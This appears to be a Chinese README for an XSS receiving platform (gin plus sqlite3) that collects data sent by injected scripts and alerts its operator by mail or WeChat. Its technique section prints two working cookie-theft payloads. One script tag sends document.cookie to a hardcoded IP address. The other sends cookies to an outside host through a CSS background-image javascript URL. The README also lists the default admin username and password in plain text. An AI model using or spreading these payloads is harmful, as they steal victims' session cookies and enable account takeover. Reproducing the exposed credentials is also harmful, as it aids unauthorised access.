## 功能

* 接收XSS传递信息     		【GET】
* 支持扩展js利用      		【身份信息查询】
* 支持JSONP跨域和劫持  	【身份信息查询】


## 逻辑

* 新建一个项目
* 编辑js文件
* 配置接收（邮件微信等等）
* 开始监听

## 构架

* gin + sqlite3
* 支持docker 


```
admin   //后台静态资源 - html
log     //存储web日志
static  //后台静态资源 - css js 
view    //存储路由信息
db      //操作数据库存储与操作
```




### 路由

```
login    登陆
index    后台管理界面
api      接口界面，用于接收数据
```



### 技术

XSS接收cookie的payload

```
<script>
    new Image().src =
        "http://124.70.82.229:8881/api?cookie="+encodeURI(document.cookie);
</script>
```

通过CSS执行js窃取cookie

```
<style>
.getcookies{
    background-image:url('javascript:new Image().src="http://jehiah.com/_sandbox/log.cgi?c=" + encodeURI(document.cookie);');
}
</style>
<p class="getcookies"></p>
```

### 数据库创建

新建数据库
```
sqlite3 xssGo.db
```
写入表，列名字

```
# id 类型 传递内容 传递IP
create table xss_info(id integer not null primary key, leixing text,cookie text,time text,ip text);
```

### 账号密码

暂时不支持多用户，账号密码代码修改

```
账号： polarnightsec
密码： jljcxy@XSSpayload
```


## 参考学习

* https://github.com/keyus/xss
* https://github.com/timwhitez/Doge-XSS-Phishing/blob/master/test.js











